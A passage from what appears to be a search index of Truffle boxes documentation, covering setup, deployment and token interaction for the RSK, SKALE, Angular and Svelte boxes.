. eth . net . getId ()). toString () List of network IDs: - mainnet: 30 - testnet: 31 - regtest (local node): 33 Exit the Truffle console: .exit Compile and migrate the smart contracts. \u00b6 We will do it running the below commands directly in the terminal, without using the truffle console, this is to show you an alternative. On any of the networks, run this commands in a terminal (not in Truffle console). To use Testnet or Mainnet, you need to specify this using the parameter -- network : truffle migrate --network testnet The migrate process in a real blockchain takes more time, because Truffle creates some transactions which need to be mined on the blockchain. Where to go from here \u00b6 Interact with the token published on an RSK network using Truffle console, doing the same steps which was done before: Get your accounts Connect with your token Check the total supply or the token balance Mint tokens Transfer tokens At this point, we have installed all requirements and created a token using Truffle framework and Open Zeppelin smart contracts library, connected to an RSK local node (Regtest), the RSK Testnet and the RSK Mainnet. Find more documentation Check out the RSK developers portal . Do you have questions? Ask in the RSK chat .", "title": "RSK Truffle Token Box"}, {"location": "boxes/rsk-token-box/#rsk-truffle-token-box", "text": "Truffle box with everything you need to start creating a token using Open Zeppelin smart contracts library in Truffle framework, connected to a RSK network. It includes network configurations for local node (regtest), Testnet and Mainnet.", "title": "RSK Truffle Token Box"}, {"location": "boxes/rsk-token-box/#requirements", "text": "There are a few technical requirements before we start. To use Truffle boxes , you need to have installed in your computer: Git a POSIX compliant shell cURL Node.js and NPM a code editor If you don't have any of them installed, go to the tutorial Truffle boxes prerequisites which have all the instructions to setup these requirements. Truffle framework Once you have those requirements installed, you only need one command to install Truffle . It is better to do it globally: npm install -g truffle", "title": "Requirements"}, {"location": "boxes/rsk-token-box/#installation", "text": "Create a new folder. For example, create the folder rsk-token . Navigate to the folder in the terminal. mkdir rsk-token cd rsk-token Run the unbox command. This also takes care of installing the necessary dependencies and it can take some time. truffle unbox rsksmart/rsk-token-box This is the result using Windows OS:", "title": "Installation"}, {"location": "boxes/rsk-token-box/#development-console", "text": "Truffle has an interactive console that also spawns a development blockchain. This is very useful for compiling, deploying and testing locally. Run the development console. This command is successful if you see a list of 10 accounts, a mnemonic and the command prompt is now truffle(develop)> truffle develop You will now be in the truffle develop console with seeded accounts and their associated private keys listed. C:\\RSK\\rsk-next>truffle develop Truffle Develop started at http://127.0.0.1:8545/ Accounts: (0) 0x1056f747cf4bc7710e178b2aeed4eb8c8506c728 (1) 0x45a71c00382c2898b5d6fae69a6f7bfe6edab80c (2) 0x1596384706dc9ac4cca7f50279a4abe591d6c3fe (3) 0x9576d0a496b645baa64f22aceb2328e7468d4113 (4) 0xd431572eef7d77584d944c1809398a155e89f830 (5) 0x92c111839718fe0800fadccc67068b40b8524a0f (6) 0x6da22b5a027146619bfe6704957f7f36ff029c48 (7) 0x2c3a82d8c3993f8c80dcaf91025437bd057df867 (8) 0xc43ae7a44f7deb759177b7093f06512a0a9ff5d7 (9) 0xe61bf00cd7dce248449cfe58f23a4ef7d542bc0b Private Keys: (0) f32f32839fe27ad906b63eafb326f26fed95c231e3c5e33c7cdd08f62db63167 (1) ebef990088f27f6ef13b5e52a77d5dcc5a76862a701908c586d01b6fe93562b3 (2) 598ccae5e4436fedeb0e798c0d254789c55a63401ebfc3ae8ddde29634ddfcde (3) 09934b80f391e0024b8cb00cd73790fdf64c4d0509e144766414fee317cd3f4e (4) ac745b84b6574b5738d364b43e0d471c9d5107504acc709c90f6f091b78c751b (5) 449654cde095f2349113ef12a93e139b4302bc95adb3619d08adf53dde9b8847 (6) c217f12a89c352fc70b5f1bd5742314b4fb1bb1e35cb779fdb3c2390106355db (7) 1d4c74dfa4e99e161130c18cc63938bb120a128cefbf1b9188efc678bf5722cb (8) 0f44e0becf2e090db498a1b747d2a758fcc81fb0241f350d61117a9c6b1fa82e (9) 85218c5eec657470dafeb09e6f7101f91d21bfe822fbeeecfc9275f798662a63 Mnemonic: virtual valve razor retreat either turn possible student grief engage attract fiber \u26a0\ufe0f Important \u26a0\ufe0f : This mnemonic was created for you by Truffle. It is not secure. Ensure you do not use it on production blockchains, or else you risk losing funds. truffle(develop)>", "title": "Development console"}, {"location": "boxes/rsk-token-box/#tokensol", "text": "Take a look at the smart contract Token.sol . You can check it out in folder contracts . Token.sol has only 7 code lines! This smart contract is a mintable ERC20 token. This means that, in addition to the standard ERC20 specification, it has a function for issuing new tokens. To create our ERC20 Token, we will import ERC20Mintable from Open Zeppelin. This library itself imports several other libraries such as SafeMath.sol , the standards for this kind of token, and the capability to mint tokens. Inside the token, we define some basic information about the token: name , symbol , and number of decimals for the precision. To inherit the library's attributes and functions, we simply define our contract as a ERC20Mintable using the is keyword in this way. Compile the smart contract. Note inside the development console we don't preface commands with truffle . To make sure you're in the development console, the command prompt must be truffle(develop)> compile The compile output should be similar to: Deploy (migrate) the smart contract. migrate And the migrate output should be similar to: Running contract tests. This Truffle box also comes with the file TestToken.js which include some examples for testing the smart contract. You can check it out in the test folder. There are many other tests which can be done to check an ERC20 token. Run this command in the development console: test This test output should be similar to: Note the command varies slightly if you're in or outside of the development console. // inside the development console. test // outside the development console. truffle test", "title": "Token.sol"}, {"location": "boxes/rsk-token-box/#interact-with-the-token-using-truffle-console", "text": "Get your accounts in Truffle console. In the Truffle console, enter: const accounts = await web3 . eth . getAccounts () Don\u2019t worry about the undefined return, it is ok. See the addresses after it by entering the command below: accounts And to view each account: accounts [ 0 ] accounts [ 1 ] Take a look in the results: Interact with the token using Truffle console. First of all, connect with your token const token = await Token . deployed () Confirm if our instance is OK. Enter the instance\u2019s name: token , then . , without space hit the TAB button twice to trigger auto-complete as seen below. This will display the published address of the smart contract, and the transaction hash for its deployment, among other things, including all public variables and methods available. token . [ TAB ] [ TAB ] Check the total supply To check if we have tokens already minted, call the totalSupply function: ( await token . totalSupply ()). toString () The returned value is 0, which is expected, since we did not perform any initial mint when we deployed the token. Check the token balance To check the balance of an account, call the balanceOf function. For example, to check the balance of account 0: ( await token . balanceOf ( accounts [ 0 ])). toString () Take a look in the results of total supply and balanceOf: The returned value is also 0, which is expected, since we did not make any initial mint when we deployed the token, and by definition no accounts can have any tokens yet. Mint tokens Run this command: token . mint ( accounts [ 0 ], 10000 ) This command sent a transaction to mint 100 tokens for account 0. You can also mint to a specific address, 0xa52515946DAABe072f446Cc014a4eaA93fb9Fd79 : token . mint ( \"0xa52515946DAABe072f446Cc014a4eaA93fb9Fd79\" , 10000 ) Reconfirm the token balance Check the balance of account 0 again: ( await token . balanceOf ( accounts [ 0 ])). toString () The returned value is 10000, which is 100 with 2 decimal places of precision. This is exactly what we expected, as we issued 100 tokens Also, you can get the balance of a specific address, for example, 0xa52515946DAABe072f446Cc014a4eaA93fb9Fd79 : ( await token . balanceOf ( \"0xa52515946DAABe072f446Cc014a4eaA93fb9Fd79\" )). toString () Take a look in the results: Check the total supply (again) Check the total supply again: ( await token . totalSupply ()). toString () The returned value is 20000, which is 200 with 2 decimal places of precision. After minting 100 tokens for 2 accounts, this is perfect! Transfer tokens To transfer 40 tokens from account 0 to account 2. This can be done by calling the transfer function. token . transfer ( accounts [ 2 ], 4000 , { from : accounts [ 0 ]}) Account 2 had no tokens before the transfer, and now it should have 40. Account 1 must have 60 tokens. Also the total supply will be the same. Let\u2019s check the balance of each account and the total supply: ( await token . balanceOf ( accounts [ 2 ])). toString () ( await token . balanceOf ( accounts [ 0 ])). toString () ( await token . totalSupply ()). toString () Take a look in the results: Great! The balances of both accounts and the total supply are correct.", "title": "Interact with the token using Truffle console"}, {"location": "boxes/rsk-token-box/#exit-truffle-console", "text": "In the Truffle console, enter this command to exit the terminal: .exit", "title": "Exit Truffle console"}, {"location": "boxes/rsk-token-box/#using-rsk-networks", "text": "This Truffle box is already configured to connect to three RSK networks: regtest (local node) testnet mainnet Testnet will be used here. We need to do some tasks: Setup an account and get R-BTC Update RSK network gas price Connect to an RSK network Deploy in the network of your choose", "title": "Using RSK networks"}, {"location": "boxes/rsk-token-box/#setup-an-account-get-r-btc", "text": "Create a wallet The easy way to setup an account is using a web3 wallet injected in the browser. Some options are: - Metamask - Nifty Select the RSK Network in the web wallet. - Nifty: select in the dropdown list - Metamask: go to RSK Testnet to configure it in Custom RPC You can learn more about account based RSK addresses . Take a look truffle-config.js file to realize that we are using HDWalletProvider with RSK Networks derivations path: - RSK Testnet dpath: m/44\u2019/37310\u2019/0\u2019/0 - RSK Mainnet dpath: m/44\u2019/137\u2019/0\u2019/0 For more information check RSKIP57 . Update .secret file After create your wallet, update your mnemonic in the file .secret , located in the folder project, and save it. Get some R-BTCs: For the RSK Testnet, get tR-BTC from our faucet . For the RSK Mainnet, get R-BTC from an exchange .", "title": "Setup an account &amp; get R-BTC"}, {"location": "boxes/rsk-token-box/#setup-the-gas-price", "text": "Gas is the internal pricing for running a transaction or contract. When you send tokens, interact with a contract, send R-BTC, or do anything else on the blockchain, you must pay for that computation. That payment is calculated as gas. In RSK, this is paid in R-BTC . The minimumGasPrice is written in the block header by miners and establishes the minimum gas price that a transaction should have in order to be included in that block. To update the minimumGasPrice in our project run this query using cURL: Testnet curl https://public-node.testnet.rsk.co/ -X POST -H \"Content-Type: application/json\" \\ --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}' \\ > .minimum-gas-price-testnet.json Mainnet curl https://public-node.rsk.co/ -X POST -H \"Content-Type: application/json\" \\ --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}' \\ > .minimum-gas-price-mainnet.json This query saved the details of latest block to file .minimum-gas-price-testnet.json or .minimum-gas-price-mainnet.json, respectively. In the truffle-config.js , we are reading the parameter minimumGasPrice in each json file. For more information about the Gas and minimumGasPrice please go to the gas page .", "title": "Setup the gas price"}, {"location": "boxes/rsk-token-box/#connect-to-rsk-testnet-or-mainnet", "text": "Run the development console for any RSK network. # Console for Testnet truffle console --network testnet # Console for Mainnet truffle console --network mainnet", "title": "Connect to RSK Testnet or Mainnet"}, {"location": "boxes/rsk-token-box/#test-the-connection-to-rsk-network", "text": "On any of the networks, run this commands in the Truffle console:", "title": "Test the connection to RSK network"}, {"location": "boxes/rsk-token-box/#block-number", "text": "Shows the last block number. ( await web3 . eth . getBlockNumber ()). toString ()", "title": "Block number"}, {"location": "boxes/rsk-token-box/#network-id", "text": "To get the network ID, run this command: ( await web3 . eth . net . getId ()). toString () List of network IDs: - mainnet: 30 - testnet: 31 - regtest (local node): 33 Exit the Truffle console: .exit", "title": "Network ID"}, {"location": "boxes/rsk-token-box/#compile-and-migrate-the-smart-contracts", "text": "We will do it running the below commands directly in the terminal, without using the truffle console, this is to show you an alternative. On any of the networks, run this commands in a terminal (not in Truffle console). To use Testnet or Mainnet, you need to specify this using the parameter -- network : truffle migrate --network testnet The migrate process in a real blockchain takes more time, because Truffle creates some transactions which need to be mined on the blockchain.", "title": "Compile and migrate the smart contracts."}, {"location": "boxes/rsk-token-box/#where-to-go-from-here", "text": "Interact with the token published on an RSK network using Truffle console, doing the same steps which was done before: Get your accounts Connect with your token Check the total supply or the token balance Mint tokens Transfer tokens At this point, we have installed all requirements and created a token using Truffle framework and Open Zeppelin smart contracts library, connected to an RSK local node (Regtest), the RSK Testnet and the RSK Mainnet. Find more documentation Check out the RSK developers portal . Do you have questions? Ask in the RSK chat .", "title": "Where to go from here"}, {"location": "boxes/scoreboard/", "text": "Your-First-Truffle-Dapp Files \u00b6 Each example from the blog post series can be found within this repo. You can either look at the files in a completed state, or check out the changes that were made in a particular section by changing the branch above. Installation \u00b6 You'll have to do ti this way until Truffle allows a way for others to create \"boxes\". Linux \u00b6 To download the main repo sudo git clone https://github.com/3of5of7/scoreboard.git To show in browser run the following command npm run dev Windows \u00b6 Download the zip file and uncompress to your desktop change \"truffle.js\" to \"truffle-config.js\" Then run the following command to install lite-server npm install lite-server --save-dev To show in browser run the following command npm run dev", "title": "Your-First-Truffle-Dapp Files"}, {"location": "boxes/scoreboard/#your-first-truffle-dapp-files", "text": "Each example from the blog post series can be found within this repo. You can either look at the files in a completed state, or check out the changes that were made in a particular section by changing the branch above.", "title": "Your-First-Truffle-Dapp Files"}, {"location": "boxes/scoreboard/#installation", "text": "You'll have to do ti this way until Truffle allows a way for others to create \"boxes\".", "title": "Installation"}, {"location": "boxes/scoreboard/#linux", "text": "To download the main repo sudo git clone https://github.com/3of5of7/scoreboard.git To show in browser run the following command npm run dev", "title": "Linux"}, {"location": "boxes/scoreboard/#windows", "text": "Download the zip file and uncompress to your desktop change \"truffle.js\" to \"truffle-config.js\" Then run the following command to install lite-server npm install lite-server --save-dev To show in browser run the following command npm run dev", "title": "Windows"}, {"location": "boxes/skale-box/", "text": "SKALE Network Box \u00b6 Overview Requirements Install Setup Get a SKALE Chain Get a Wallet Fund your Wallet with sFUEL Update Truffle Config Deploy to the SKALE Network Test SKALE Network Resource Links Support ## Overview Welcome to the SKALE Network Box! This Truffle SKALE Network box provides you with all the basics necessary to kick-start scaling your application with the SKALE Network. You can find out more information about getting started with SKALE within the Developer Getting Started Guide . This box comes with everything you need to start using smart contracts from a react app on the SKALE Network. The SKALE Network is fully decentralized, and is supported by a validator community represented by over 48 validator orgs running over 150 nodes. Since the network is EVM compatible, all existing tools built for Ethereum will work directly within the SKALE Network as well. For example, the SKALE Network is fully compatible with the all Ethereum native wallets. Check out the SKALE Network Dev Portal for easy integration scripts fo connecting your favorite wallet, here . For example, connecting MetaMask to SKALE in a seamless way can be seen in this document: https://docs.skale.network/develop/wallets/metamask All SKALE Chains contain the following features: Full EVM Support for Solidity Smart Contracts Interchain Messaging for managing Tokens (ETH, ERC20, ERC721, etc.) Decentralized Storage Integration Support for All Ethereum Tools Wallet Support for API and HSM Wallets Lastly, the SKALE Network uses a unique combination of several technologies to achieve scalability, security, interoperability, and progressive decentralization: Technology Impact Pooled Validation Proof-of-Stake Scalable security model across validators and delegators Hybrid Container Architecture Agile allocation of on-demand composable compute resources across the network Threshold Cryptography Supermajority signature signing with ABBA consensus supports Byzantine Fault Tolerance and resolves data-availability issues Trusted-Execution Environment Fast block signing and multiple chain support using threshold cryptography Asynchronous Binary Byzantine Agreement (ABBA) Consensus Mathematically provable, fast-finality, leaderless, and Byzantine Fault Tolerant Ethereum Network Public, open-source, and decentralized operation of the SKALE Network via SKALE Manager contracts Requirements \u00b6 The SKALE Network box has the following requirements: Node.js 12.x or later NPM version 5.2 or later Windows, Linux or MacOS Installation \u00b6 $ truffle unbox skalenetwork/truffle-skale-network-box $ npm install Setup \u00b6 1) Get a SKALE Chain \u00b6 The SKALE Network is a multichain platform, and there are many ways to get access to the SKALE Network testing environments. To obtain your SKALE Chain endpoint and Chain ID, check out the SKALE Network getting started guide . Alternatively, for faster testing please feel free to use the available SDK Repo and Documentation . 2) Get a Wallet \u00b6 The SKALE Network works with a variety of wallet solutions. If you already have a wallet and private key to use, you can skip this step and go to the next section: Update Truffle Config . You can pick and setup your favorite wallet from the documentation here . We recommend starting with MetaMask, and obtaining a wallet address and private key to use for testing from the MetaMask wallet . Fund your Wallet with sFUEL \u00b6 SKALE Chains enable dApps to run scalable, cost-free transactions. This provides an effective way to scale your dApp not only for speed but also to scale economically. SKALE Chains do require sFUEL to conduct transactions \u2013 this sFUEL is a gas token with no economic value and provides a way for dApps to facilitate permissive access to SKALE Chains and protects against DDoS attacks. There are a few ways developers can manage and allocate SKALE FUEL (sFUEL), depending on your setup. You can learn more about sFUEL here . 3) Update Truffle Config \u00b6 You can add the SKALE Chain endpoint and private key directly into the truffle-config.js file by replacing the following: const privateKey = process.env.PRIVATE_KEY; const skale = process.env.SKALE_CHAIN; For example: const privateKey = \"0x0000000000000000000000000000000000000000000000000000000000000000\"; const skale = \"https://this-is-my-skale-chain.com:1234\"; A more secure way would be to leave the truffle-config.js as is, and create a .env file at the root directory of your project to hold onto your private key and SKALE Chain endpoint. Your .env file should look like: SKALE_CHAIN=https://this-is-my-skale-chain.com:1234 PRIVATE_KEY=0x0000000000000000000000000000000000000000000000000000000000000000 To learn more about using environment variables within a .env file, see: https://www.npmjs.com/package/dotenv Using a mnemonic \u00b6 If you'd prefer to use a mnemonic (vs a private key), you can just omit the PRIVATE_KEY entry in your .env file and include a MNEMONIC entry instead. Note that HDWalletProvider will use the first account that's generated from the mnemonic. For example: SKALE_CHAIN=https://this-is-my-skale-chain.com:1234 MNEMONIC=test test test test test test test test test test test test Deploy to the SKALE Network \u00b6 You can use Truffle to compile and migrate your smart contracts to the SKALE Network. The following command will compile and migrate the smart contract(s) to SKALE: truffle migrate --network skale --compile-all --config=truffle-config.skale.js For more information on available Truffle commands, please see the Truffle documentation here: https://www.trufflesuite.com/docs/truffle/reference/truffle-commands Testing \u00b6 Truffle can run tests written in Solidity or JavaScript against your smart contracts. Note the command varies slightly if you're in or outside of the development console. // inside the truffle development console. test --network skale --config=truffle-config.skale.js // outside the truffle development console. truffle test --network skale --config=truffle-config.skale.js Resources \u00b6 SKALE Network Resources Links - Website - Blog - Github - Whitepaper - Developer Docs SKALE Network Community Links - Discord - Twitter - Telegram Support \u00b6 Support for this box is available via the Truffle community here . In addition, SKALE Network support is available here .", "title": "SKALE Network Box"}, {"location": "boxes/skale-box/#skale-network-box", "text": "Overview Requirements Install Setup Get a SKALE Chain Get a Wallet Fund your Wallet with sFUEL Update Truffle Config Deploy to the SKALE Network Test SKALE Network Resource Links Support ## Overview Welcome to the SKALE Network Box! This Truffle SKALE Network box provides you with all the basics necessary to kick-start scaling your application with the SKALE Network. You can find out more information about getting started with SKALE within the Developer Getting Started Guide . This box comes with everything you need to start using smart contracts from a react app on the SKALE Network. The SKALE Network is fully decentralized, and is supported by a validator community represented by over 48 validator orgs running over 150 nodes. Since the network is EVM compatible, all existing tools built for Ethereum will work directly within the SKALE Network as well. For example, the SKALE Network is fully compatible with the all Ethereum native wallets. Check out the SKALE Network Dev Portal for easy integration scripts fo connecting your favorite wallet, here . For example, connecting MetaMask to SKALE in a seamless way can be seen in this document: https://docs.skale.network/develop/wallets/metamask All SKALE Chains contain the following features: Full EVM Support for Solidity Smart Contracts Interchain Messaging for managing Tokens (ETH, ERC20, ERC721, etc.) Decentralized Storage Integration Support for All Ethereum Tools Wallet Support for API and HSM Wallets Lastly, the SKALE Network uses a unique combination of several technologies to achieve scalability, security, interoperability, and progressive decentralization: Technology Impact Pooled Validation Proof-of-Stake Scalable security model across validators and delegators Hybrid Container Architecture Agile allocation of on-demand composable compute resources across the network Threshold Cryptography Supermajority signature signing with ABBA consensus supports Byzantine Fault Tolerance and resolves data-availability issues Trusted-Execution Environment Fast block signing and multiple chain support using threshold cryptography Asynchronous Binary Byzantine Agreement (ABBA) Consensus Mathematically provable, fast-finality, leaderless, and Byzantine Fault Tolerant Ethereum Network Public, open-source, and decentralized operation of the SKALE Network via SKALE Manager contracts", "title": "SKALE Network Box"}, {"location": "boxes/skale-box/#requirements", "text": "The SKALE Network box has the following requirements: Node.js 12.x or later NPM version 5.2 or later Windows, Linux or MacOS", "title": "Requirements"}, {"location": "boxes/skale-box/#installation", "text": "$ truffle unbox skalenetwork/truffle-skale-network-box $ npm install", "title": "Installation"}, {"location": "boxes/skale-box/#setup", "text": "", "title": "Setup"}, {"location": "boxes/skale-box/#1-get-a-skale-chain", "text": "The SKALE Network is a multichain platform, and there are many ways to get access to the SKALE Network testing environments. To obtain your SKALE Chain endpoint and Chain ID, check out the SKALE Network getting started guide . Alternatively, for faster testing please feel free to use the available SDK Repo and Documentation .", "title": "1) Get a SKALE Chain"}, {"location": "boxes/skale-box/#2-get-a-wallet", "text": "The SKALE Network works with a variety of wallet solutions. If you already have a wallet and private key to use, you can skip this step and go to the next section: Update Truffle Config . You can pick and setup your favorite wallet from the documentation here . We recommend starting with MetaMask, and obtaining a wallet address and private key to use for testing from the MetaMask wallet .", "title": "2) Get a Wallet"}, {"location": "boxes/skale-box/#fund-your-wallet-with-sfuel", "text": "SKALE Chains enable dApps to run scalable, cost-free transactions. This provides an effective way to scale your dApp not only for speed but also to scale economically. SKALE Chains do require sFUEL to conduct transactions \u2013 this sFUEL is a gas token with no economic value and provides a way for dApps to facilitate permissive access to SKALE Chains and protects against DDoS attacks. There are a few ways developers can manage and allocate SKALE FUEL (sFUEL), depending on your setup. You can learn more about sFUEL here .", "title": "Fund your Wallet with sFUEL"}, {"location": "boxes/skale-box/#3-update-truffle-config", "text": "You can add the SKALE Chain endpoint and private key directly into the truffle-config.js file by replacing the following: const privateKey = process.env.PRIVATE_KEY; const skale = process.env.SKALE_CHAIN; For example: const privateKey = \"0x0000000000000000000000000000000000000000000000000000000000000000\"; const skale = \"https://this-is-my-skale-chain.com:1234\"; A more secure way would be to leave the truffle-config.js as is, and create a .env file at the root directory of your project to hold onto your private key and SKALE Chain endpoint. Your .env file should look like: SKALE_CHAIN=https://this-is-my-skale-chain.com:1234 PRIVATE_KEY=0x0000000000000000000000000000000000000000000000000000000000000000 To learn more about using environment variables within a .env file, see: https://www.npmjs.com/package/dotenv", "title": "3) Update Truffle Config"}, {"location": "boxes/skale-box/#using-a-mnemonic", "text": "If you'd prefer to use a mnemonic (vs a private key), you can just omit the PRIVATE_KEY entry in your .env file and include a MNEMONIC entry instead. Note that HDWalletProvider will use the first account that's generated from the mnemonic. For example: SKALE_CHAIN=https://this-is-my-skale-chain.com:1234 MNEMONIC=test test test test test test test test test test test test", "title": "Using a mnemonic"}, {"location": "boxes/skale-box/#deploy-to-the-skale-network", "text": "You can use Truffle to compile and migrate your smart contracts to the SKALE Network. The following command will compile and migrate the smart contract(s) to SKALE: truffle migrate --network skale --compile-all --config=truffle-config.skale.js For more information on available Truffle commands, please see the Truffle documentation here: https://www.trufflesuite.com/docs/truffle/reference/truffle-commands", "title": "Deploy to the SKALE Network"}, {"location": "boxes/skale-box/#testing", "text": "Truffle can run tests written in Solidity or JavaScript against your smart contracts. Note the command varies slightly if you're in or outside of the development console. // inside the truffle development console. test --network skale --config=truffle-config.skale.js // outside the truffle development console. truffle test --network skale --config=truffle-config.skale.js", "title": "Testing"}, {"location": "boxes/skale-box/#resources", "text": "SKALE Network Resources Links - Website - Blog - Github - Whitepaper - Developer Docs SKALE Network Community Links - Discord - Twitter - Telegram", "title": "Resources"}, {"location": "boxes/skale-box/#support", "text": "Support for this box is available via the Truffle community here . In addition, SKALE Network support is available here .", "title": "Support"}, {"location": "boxes/skaledapp/", "text": "Angular8 Material + Truffle = \ud83d\udc93 Beautyfull \u00d0APP \u00b6 This Trufflebox provides a base for Truffle Framework and Angular DAPP using the power of the Skale sidechain. and you can make transactions between accounts upload images and Skale up you app with beautiful material design This was generated with Angular CLI version 8.3.0. Development server \u00b6 Run ng serve for a dev server. Navigate to http://localhost:4200/ . The app will automatically reload if you change any of the source files. Code scaffolding \u00b6 Run ng generate component component-name to generate a new component. You can also use ng generate directive|pipe|service|class|guard|interface|enum|module . Build \u00b6 Install truffle, Angular CLI and an Ethereum client. If you don't have a test environment npm install -g truffle npm install -g @angular/cli npm install -g ganache-cli Download the box. Run your Ethereum client. For Ganache CLI: ganache-cli Note the mnemonic 12-word phrase printed on startup, you will need it later. Install the dependencies and Compile and migrate your contracts, into the directory Blockchain using : npm install Change the port in truffle-config.js change the port in truffle-config.js 8545 in windows the port is 7545 but in linux the defaul port is 8545 Navigate into Contracts Directory and install and compile contracts npm install & truffle compile if you wanto to deploy to custom network like material use truffle deploy --reset --network material --compile-all Navigate into the Frontend Directory npm install & ng serve , And lets Buidl If you want to customize <=== First Change the contract in Blockchain/contracts or make your contract and compile and migrate Second Change the app/service/contract.service.ts with your built contract .json and you custom directives and functions if you want more info vistit https://developers.materiallabs.com/getting-started Common errors and their solutions \u00b6 Error Solution Module not found: Error: Can't resolve '../../../../../Contracts/build/contracts/Payment.json' during ng serve Run truffle compile inside contracts Error: the tx doesn't have the correct nonce. in MetaMask Reset MetaMask: Settings -> Reset Account //Warning only with test accounts Error getting balance; see log. in UI, with Error: MetaCoin has not been deployed to detected network (network/artifact mismatch) in browser console Ensure you have started ganache, run truffle migrate and configured MetaMask to point to ganache Code contributions welcome! \u00b6 Fork it Add new features git checkout -b my-new-feature git commit -am 'Add some feature' git push origin my-new-feature Create a pull request", "title": "Angular8 Material + Truffle = \ud83d\udc93 Beautyfull \u00d0APP"}, {"location": "boxes/skaledapp/#angular8-material-truffle-beautyfull-app", "text": "This Trufflebox provides a base for Truffle Framework and Angular DAPP using the power of the Skale sidechain. and you can make transactions between accounts upload images and Skale up you app with beautiful material design This was generated with Angular CLI version 8.3.0.", "title": "Angular8 Material + Truffle = \ud83d\udc93 Beautyfull \u00d0APP"}, {"location": "boxes/skaledapp/#development-server", "text": "Run ng serve for a dev server. Navigate to http://localhost:4200/ . The app will automatically reload if you change any of the source files.", "title": "Development server"}, {"location": "boxes/skaledapp/#code-scaffolding", "text": "Run ng generate component component-name to generate a new component. You can also use ng generate directive|pipe|service|class|guard|interface|enum|module .", "title": "Code scaffolding"}, {"location": "boxes/skaledapp/#build", "text": "Install truffle, Angular CLI and an Ethereum client. If you don't have a test environment npm install -g truffle npm install -g @angular/cli npm install -g ganache-cli Download the box. Run your Ethereum client. For Ganache CLI: ganache-cli Note the mnemonic 12-word phrase printed on startup, you will need it later. Install the dependencies and Compile and migrate your contracts, into the directory Blockchain using : npm install Change the port in truffle-config.js change the port in truffle-config.js 8545 in windows the port is 7545 but in linux the defaul port is 8545 Navigate into Contracts Directory and install and compile contracts npm install & truffle compile if you wanto to deploy to custom network like material use truffle deploy --reset --network material --compile-all Navigate into the Frontend Directory npm install & ng serve , And lets Buidl If you want to customize <=== First Change the contract in Blockchain/contracts or make your contract and compile and migrate Second Change the app/service/contract.service.ts with your built contract .json and you custom directives and functions if you want more info vistit https://developers.materiallabs.com/getting-started", "title": "Build"}, {"location": "boxes/skaledapp/#common-errors-and-their-solutions", "text": "Error Solution Module not found: Error: Can't resolve '../../../../../Contracts/build/contracts/Payment.json' during ng serve Run truffle compile inside contracts Error: the tx doesn't have the correct nonce. in MetaMask Reset MetaMask: Settings -> Reset Account //Warning only with test accounts Error getting balance; see log. in UI, with Error: MetaCoin has not been deployed to detected network (network/artifact mismatch) in browser console Ensure you have started ganache, run truffle migrate and configured MetaMask to point to ganache", "title": "Common errors and their solutions"}, {"location": "boxes/skaledapp/#code-contributions-welcome", "text": "Fork it Add new features git checkout -b my-new-feature git commit -am 'Add some feature' git push origin my-new-feature Create a pull request", "title": "Code contributions welcome!"}, {"location": "boxes/svelte-box/", "text": "SvelteJS Truffle Box \u00b6 A Truffle box using SvelteJS and Rollup . This box contains everything you need to start building a smart-contract app. Project Goal \u00b6 To provide the simplest, cleanest seed for building an Ethereum dapp using Truffle , with the minimum possible dependencies, meaning that beginners and pros a like have the most transparent possible method for developing Ethereum contracts. Truffle Box \u00b6 A truffle box is a seed project for building a truffle dapp. Why Svelte? \u00b6 Svelte was chosen as it is a rich, state-model based, ES6, component framework with very few dependencies, which is nothing more than html, javascript, and css. Once compiled via svelte, there are no clientside dependencies at all - simply vanilla JS. Svelte is basically a simple DSL (domain specific language) for building a reactive, stateful, dependency-free web-application in pure javascript. Additionally, the Svelte API is so simple and well-designed, you can learn the whole thing from scratch in less than an hour! Why Rollup? \u00b6 Originally this project used ParcelJS but sadly Parcel's support for Svelte is currently broken, and has been for a while. I've switched to RollupJS in order to upgrade to Svelte 3. Currently, we load web3 from UNPKG, since it appears to be borderline impossible to bundle successfully. If anybody wants to open a PR to bundle Web3, it would be greatly appreciated. Setting up \u00b6 Install truffle and an ethereum client. For local development, try Ethereum TestRPC. npm install - g truffle // Version 3.0.5+ required. npm install - g ganache - cli // Or the ganache GUI will work too. Download box. truffle unbox antony / svelte - box Run an Ethereum RPC. For simplicity and development we will be using Ethereum TestRPC. ganache - cli Compile and migrate the contracts after authenticating your account on the blockchain (i.e. restoring from seed in MetaMask). truffle compile truffle migrate You're ready to go! Usage \u00b6 Components are in src/components/*.html . Everything else is in the usual place according to the docs Run the testrpc so that you have a blockchain to work with, and deploy your contracts: testrpc truffle deploy Log in to metamask by importing the HD Wallet that testrpc gave you, and do the same for one of the accounts by entering its private key. Then, run the dev task to have the code updated in realtime as you develop: truffle compile npm run dev Publishing \u00b6 To produce your production dApp, run the build task: npm run build This will publish your completed dApp to the folder ./dist Testing \u00b6 Testing works much the same way as it does in any web-application, with an additional truffle test command for testing smart contracts. Be sure you've compiled your contracts before running the tests, or you'll get file not found errors. ```javascript npm run test:unit // for dApp tests npm run test:contract // for contract tests ``` Releasing \u00b6 To build the application for production, use the build command. A production build will be in the ./dist folder. ```javascript npm run build ``` FAQ \u00b6 Why is there both a truffle.js file and a truffle-config.js file? Truffle requires the truffle.js file be named truffle-config on Windows machines. Feel free to delete the file that doesn't correspond to your platform.", "title": "Index"}, {"location": "boxes/svelte-box/#sveltejs-truffle-box", "text": "A Truffle box using SvelteJS and Rollup . This box contains everything you need to start building a smart-contract app.", "title": "SvelteJS Truffle Box"}, {"location": "boxes/svelte-box/#project-goal", "text": "To provide the simplest, cleanest seed for building an Ethereum dapp using Truffle , with the minimum possible dependencies, meaning that beginners and pros a like have the most transparent possible method for developing Ethereum contracts.", "title": "Project Goal"}, {"location": "boxes/svelte-box/#truffle-box", "text": "A truffle box is a seed project for building a truffle dapp.", "title": "Truffle Box"}, {"location": "boxes/svelte-box/#why-svelte", "text": "Svelte was chosen as it is a rich, state-model based, ES6, component framework with very few dependencies, which is nothing more than html, javascript, and css. Once compiled via svelte, there are no clientside dependencies at all - simply vanilla JS. Svelte is basically a simple DSL (domain specific language) for building a reactive, stateful, dependency-free web-application in pure javascript. Additionally, the Svelte API is so simple and well-designed, you can learn the whole thing from scratch in less than an hour!", "title": "Why Svelte?"}, {"location": "boxes/svelte-box/#why-rollup", "text": "Originally this project used ParcelJS but sadly Parcel's support for Svelte is currently broken, and has been for a while. I've switched to RollupJS in order to upgrade 